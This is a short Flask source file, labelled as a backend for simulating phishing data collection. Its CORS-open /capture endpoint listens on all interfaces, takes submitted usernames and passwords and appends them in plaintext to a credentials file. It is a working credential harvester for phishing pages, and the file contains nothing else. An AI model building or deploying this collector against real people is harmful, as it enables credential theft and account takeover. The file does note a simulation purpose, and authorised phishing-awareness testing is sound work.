# Flask backend for simulating phishing attack data collection

from flask import Flask, request, jsonify
from flask_cors import CORS  # Enable CORS for cross-origin requests
import os

app = Flask(__name__)
CORS(app)

CREDENTIALS_FILE = "/home/user/html_server/credentials.txt"  # Path to store credentials


@app.route('/capture', methods=['POST', 'OPTIONS'])
def capture_credentials():
    if request.method == 'OPTIONS':  # Handle CORS preflight request
        return '', 200

    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        username = data.get('username')
        password = data.get('password')

        if not username or not password:
            return jsonify({"error": "Invalid input"}), 400

        # Ensure the storage directory exists
        os.makedirs(os.path.dirname(CREDENTIALS_FILE), exist_ok=True)

        # Append credentials to the file
        with open(CREDENTIALS_FILE, "a") as file:
            file.write(f"Username: {username}\nPassword: {password}\n\n")

        return jsonify({"message": "Data captured successfully!"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
